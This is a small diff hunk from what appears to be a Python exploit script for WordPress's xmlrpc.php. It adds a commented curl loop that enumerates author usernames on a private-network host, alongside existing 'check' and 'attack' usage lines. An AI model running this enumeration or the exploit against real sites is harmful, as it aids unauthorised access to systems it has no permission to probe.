@@ -5,7 +5,9 @@
 # TODO:
 # - Try and detect a pingback URL on target site
 # - Optimise number of entries per request, check class-wp-xmlrpc-server.php
-
+#for i in {1..10}; do 
+#  curl -s -L -w "%{url_effective}\n" -o /dev/null "http://192.168.1.81/?author=$i"
+#done
 #python3 47800.py check http://192.168.1.81/xmlrpc.php http://192.168.1.81
 #python3 47800.py attack http://192.168.1.81/xmlrpc.php http://192.168.1.81
 from urllib.parse import urlparse
